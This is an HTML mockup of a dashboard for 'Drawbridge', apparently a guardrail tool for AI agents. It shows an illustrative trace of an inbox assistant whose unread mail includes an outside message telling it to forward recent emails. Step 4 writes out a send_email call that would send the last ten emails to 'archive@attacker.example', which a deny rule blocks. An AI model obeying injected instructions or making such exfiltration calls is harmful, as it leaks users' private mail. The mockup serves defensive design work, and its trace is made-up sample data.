@@ -1,0 +1,150 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>Drawbridge live trace</title>
+<script src="./support.js"></script>
+</head>
+<body>
+<x-dc>
+<helmet>
+<link href="https://fonts.googleapis.com/css2?family=Big+Shoulders+Display:wght@700;800&family=JetBrains+Mono:wght@400;500&family=Schibsted+Grotesk:wght@400;500;600&display=swap" rel="stylesheet">
+<style>
+body{margin:0;background:#EDE8DC}
+:root{--bone:#EDE8DC;--bone2:#F7F4EC;--ink:#0F1412;--ink2:#1C2420;--steel:#CFCABB;--stone:#565D56;--mute:#A9B0A8;--sig:#FF5B1F;--sigt:#B83400;--clr:#1F7A5A;--clrt:#17624A;--cau:#F2C230;--tsig:#FFD3C0;--tclr:#C6E3D6;--tcau:#F8E7A6}
+.app{width:1440px;height:900px;display:flex;flex-direction:column;font-family:'Schibsted Grotesk',system-ui,sans-serif;color:var(--ink);background:var(--bone);font-size:16px;line-height:1.5;overflow:hidden}
+.app *{box-sizing:border-box}
+.app a{color:inherit;text-decoration:none}
+.disp{font-family:'Big Shoulders Display','Archivo Narrow',Impact,sans-serif;font-weight:800;line-height:.94;text-transform:uppercase;margin:0}
+.lab{font-family:'JetBrains Mono',ui-monospace,monospace;font-size:12px;line-height:16px;letter-spacing:.08em;text-transform:uppercase;font-weight:500}
+.mono{font-family:'JetBrains Mono',ui-monospace,monospace}
+.top{height:64px;flex:0 0 64px;display:flex;align-items:center;justify-content:space-between;padding:0 28px;border-bottom:2px solid var(--ink);background:var(--bone2)}
+.body{flex:1;display:grid;grid-template-columns:280px minmax(0,1fr) 410px;min-height:0}
+.side{border-right:2px solid var(--ink);padding:22px 18px;display:flex;flex-direction:column;gap:10px;background:var(--bone)}
+.run{display:block;padding:12px 14px;border:2px solid transparent;border-radius:2px}
+.run:hover{background:var(--bone2)}
+.run.sel{background:var(--bone2);border-color:var(--ink);box-shadow:4px 4px 0 var(--sig)}
+.center{padding:26px 30px;overflow:hidden;display:flex;flex-direction:column;gap:14px}
+.st{display:grid;grid-template-columns:40px minmax(0,1fr) auto;gap:16px;align-items:start;padding:14px 18px;border:2px solid var(--ink);background:var(--bone2)}
+.st.sel{border-color:var(--sig);box-shadow:6px 6px 0 var(--sig)}
+.num{width:40px;height:40px;border:2px solid var(--ink);display:flex;align-items:center;justify-content:center;background:var(--bone)}
+.chip{display:inline-flex;align-items:center;gap:7px;padding:4px 9px;border:1.5px solid var(--ink);border-radius:2px;background:var(--bone2)}
+.chip i{width:8px;height:8px;border-radius:50%;background:var(--ink);display:block}
+.chip.u{background:var(--tsig);border-color:var(--sigt);color:var(--sigt)}.chip.u i{background:var(--sig)}
+.chip.t{background:var(--tclr);border-color:var(--clrt);color:var(--clrt)}.chip.t i{background:var(--clr)}
+.chip.w{background:var(--tcau);border-color:var(--ink)}
+.bdg{display:inline-block;font-family:'JetBrains Mono',monospace;font-size:11px;letter-spacing:.08em;text-transform:uppercase;font-weight:500;padding:4px 8px;border:2px solid var(--ink);border-radius:2px;white-space:nowrap;line-height:14px}
+.bdg.ok{background:var(--clr);color:var(--bone2)}.bdg.no{background:var(--sig);color:var(--ink)}.bdg.ask{background:var(--cau);color:var(--ink)}
+.insp{border-left:2px solid var(--ink);background:var(--bone2);padding:26px 26px 20px;display:flex;flex-direction:column;gap:18px;overflow:hidden}
+.lin{display:flex;flex-direction:column;gap:0}
+.lin>div{border:2px solid var(--ink);padding:10px 14px;background:var(--bone);display:flex;justify-content:space-between;align-items:center;gap:10px}
+.lin>i{display:block;width:2px;height:14px;background:var(--ink);margin-left:28px}
+.code{margin:0;background:var(--ink);color:var(--bone2);padding:16px 18px;font-family:'JetBrains Mono',monospace;font-size:14px;line-height:22px;white-space:pre;overflow:hidden}
+.k{color:#7FD1B0}.r{color:#FF9B73}
+.btn{display:inline-flex;align-items:center;justify-content:center;min-height:48px;padding:10px 20px;border:2px solid var(--ink);border-radius:2px;font-weight:600;font-size:15px;cursor:pointer;font-family:inherit;transition:transform .15s cubic-bezier(.2,.8,.2,1),box-shadow .15s}
+.btn-p{background:var(--ink);color:var(--bone2);box-shadow:4px 4px 0 var(--sig)}
+.btn-p:hover{transform:translate(-2px,-2px);box-shadow:6px 6px 0 var(--sig)}
+.btn-s{background:var(--bone2);color:var(--ink)}
+.btn-s:hover{background:var(--tcau)}
+.app a:focus-visible,.app button:focus-visible{outline:3px solid var(--cau);outline-offset:2px}
+.rise{animation:rise .6s cubic-bezier(.2,.8,.2,1) both}
+.d1{animation-delay:.1s}.d2{animation-delay:.3s}.d3{animation-delay:.5s}.d4{animation-delay:.7s}.d5{animation-delay:.9s}.d6{animation-delay:1.2s}
+.slide{animation:slide .6s cubic-bezier(.2,.8,.2,1) both 1.1s}
+.stamp{position:absolute;right:18px;top:-18px;padding:5px 12px;border:3px solid var(--sigt);color:var(--sigt);background:var(--bone2);border-radius:3px;transform:rotate(-4deg);animation:stamp .5s cubic-bezier(.2,.8,.2,1) both 1.3s}
+@keyframes rise{from{opacity:0;transform:translateY(20px)}to{opacity:1;transform:none}}
+@keyframes slide{from{opacity:0;transform:translateX(30px)}to{opacity:1;transform:none}}
+@keyframes stamp{0%{opacity:0;transform:scale(2.4) rotate(-14deg)}60%{opacity:1;transform:scale(.94) rotate(-4deg)}100%{opacity:1;transform:scale(1) rotate(-4deg)}}
+@media (prefers-reduced-motion:reduce){.app *{animation:none!important;transition:none!important}}
+</style>
+</helmet>
+<div class="app">
+
+<header class="top">
+  <div style="display:flex;align-items:center;gap:28px">
+    <a href="Main.dc.html" style="display:flex;align-items:center;gap:10px" aria-label="Drawbridge home">
+      <svg width="30" height="30" viewBox="0 0 36 36" fill="none" aria-hidden="true"><path d="M4 33V11h6V6h5v5h6V6h5v5h6V33z" fill="#F7F4EC" stroke="#0F1412" stroke-width="2.5" stroke-linejoin="round"/><path d="M13 33V24a5 5 0 0 1 10 0V33z" fill="#FF5B1F" stroke="#0F1412" stroke-width="2.5" stroke-linejoin="round"/></svg>
+      <span class="disp" style="font-size:26px">Drawbridge</span>
+    </a>
+    <span class="lab" style="color:#565D56">Runs / inbox-assistant / run #42</span>
+  </div>
+  <div style="display:flex;align-items:center;gap:14px">
+    <span class="bdg no">1 blocked</span>
+    <span class="bdg ok">0 leaked</span>
+    <a class="btn btn-s" href="Lab.dc.html" style="min-height:44px">Attack lab</a>
+  </div>
+</header>
+
+<div class="body">
+  <aside class="side" aria-label="Runs">
+    <div class="lab" style="color:#565D56;padding:0 4px 4px">Recent runs</div>
+    <div style="display:flex;gap:8px;padding:0 4px 8px;flex-wrap:wrap">
+      <span class="chip" style="background:#0F1412;color:#F7F4EC"><span class="lab">All</span></span>
+      <span class="chip"><span class="lab">Blocked</span></span>
+      <span class="chip"><span class="lab">Asked</span></span>
+    </div>
+    <a class="run sel" href="Trace.dc.html"><div style="display:flex;justify-content:space-between"><b style="font-weight:600">Run #42</b><span class="bdg no" style="font-size:10px;padding:2px 6px">Blocked</span></div><div style="color:#565D56;font-size:14px">inbox-assistant &middot; 1 min ago</div></a>
+    <a class="run" href="Trace.dc.html"><div style="display:flex;justify-content:space-between"><b style="font-weight:600">Run #41</b><span class="bdg ok" style="font-size:10px;padding:2px 6px">Clean</span></div><div style="color:#565D56;font-size:14px">inbox-assistant &middot; 9 min ago</div></a>
+    <a class="run" href="Trace.dc.html"><div style="display:flex;justify-content:space-between"><b style="font-weight:600">Run #40</b><span class="bdg ask" style="font-size:10px;padding:2px 6px">Asked</span></div><div style="color:#565D56;font-size:14px">calendar-helper &middot; 22 min ago</div></a>
+    <a class="run" href="Trace.dc.html"><div style="display:flex;justify-content:space-between"><b style="font-weight:600">Run #39</b><span class="bdg ok" style="font-size:10px;padding:2px 6px">Clean</span></div><div style="color:#565D56;font-size:14px">inbox-assistant &middot; 1 h ago</div></a>
+    <div style="flex:1"></div>
+    <div class="lab" style="color:#565D56;padding:0 4px">Sample runs for the design</div>
+  </aside>
+
+  <main class="center">
+    <div class="rise" style="display:flex;justify-content:space-between;align-items:flex-end;gap:16px">
+      <div>
+        <div class="lab" style="color:#565D56">Task</div>
+        <h1 class="disp" style="font-size:44px;margin-top:6px">Summarize my unread email</h1>
+      </div>
+      <span class="lab" style="color:#565D56">5 steps &middot; 6 seconds</span>
+    </div>
+
+    <div class="st rise d1"><div class="num mono">1</div><div><div class="lab" style="color:#565D56">User task</div><div style="font-size:17px">Summarize my unread email.</div></div><span class="chip t"><i></i><span class="lab">Trusted</span></span></div>
+
+    <div class="st rise d2"><div class="num mono">2</div><div><div class="lab" style="color:#565D56">Tool &middot; read_email</div><div class="mono" style="font-size:14px">read_email(inbox, unread) &rarr; 3 messages</div><div style="margin-top:6px;font-size:14px;color:#B83400">Message #3 came from an external sender.</div></div><span style="display:flex;flex-direction:column;align-items:flex-end;gap:6px"><span class="bdg ok">Allowed</span><span class="chip u"><i></i><span class="lab">Untrusted</span></span></span></div>
+
+    <div class="st rise d3"><div class="num mono">3</div><div><div class="lab" style="color:#565D56">Model</div><div style="font-size:17px">Message #3 tells me to forward recent mail.</div></div><span class="chip w"><i></i><span class="lab">Context tainted</span></span></div>
+
+    <div class="st sel rise d4" style="position:relative"><div class="stamp lab">Stopped</div><div class="num mono" style="background:#FF5B1F">4</div><div><div class="lab" style="color:#B83400">Tool &middot; send_email</div><div class="mono" style="font-size:14px;word-break:break-all">send_email(to: "archive@attacker.example", body: last 10 emails)</div><div style="margin-top:6px;font-size:14px;color:#565D56">Rule deny-egress-tainted</div></div><span class="bdg no">Blocked</span></div>
+
+    <div class="st rise d5"><div class="num mono">5</div><div><div class="lab" style="color:#565D56">Tool &middot; summarize</div><div class="mono" style="font-size:14px">summarize(messages: 1&ndash;3)</div><div style="margin-top:6px;font-size:14px;color:#565D56">Message #3 quoted as text, not obeyed.</div></div><span class="bdg ok">Allowed</span></div>
+  </main>
+
+  <aside class="insp slide" aria-label="Inspector for step 4">
+    <div class="lab" style="color:#565D56">Inspector &middot; step 4</div>
+    <h2 class="disp" style="font-size:64px;color:#B83400">Blocked.</h2>
+    <p style="margin:0;font-size:17px;line-height:26px">The recipient came from text written by an outside sender, and <span class="mono" style="font-size:14px">send_email</span> may not act on that.</p>
+    <div>
+      <div class="lab" style="color:#565D56;margin-bottom:8px">Where the address came from</div>
+      <div class="lin">
+        <div><span>Email #3 body</span><span class="chip u"><i></i><span class="lab">Untrusted</span></span></div>
+        <i></i>
+        <div><span>Model context</span><span class="chip w"><i></i><span class="lab">Tainted</span></span></div>
+        <i></i>
+        <div><span class="mono" style="font-size:14px">send_email.to</span><span class="bdg no">Blocked</span></div>
+      </div>
+    </div>
+    <div>
+      <div class="lab" style="color:#565D56;margin-bottom:8px">Rule that fired</div>
+<pre class="code"><span class="k">deny:</span> send_email
+<span class="k">when:</span> context.tainted
+  and args.to not in contacts</pre>
+    </div>
+    <div style="display:flex;flex-wrap:wrap;gap:12px">
+      <button class="btn btn-s">Approve once</button>
+      <button class="btn btn-p">Always block</button>
+      <a class="btn btn-s" href="Policy.dc.html">Edit policy</a>
+    </div>
+    <p style="margin:0;font-size:14px;line-height:21px;color:#565D56">Decisions come from written rules, so the same input always gives the same answer. No model judges the model.</p>
+  </aside>
+</div>
+
+</div>
+</x-dc>
+<script type="text/x-dc" data-dc-script data-props='{"$preview":{"width":1440,"height":900}}'>
+class Component extends DCLogic {
+  renderVals() { return {}; }
+}
+</script>
+</body>
+</html>
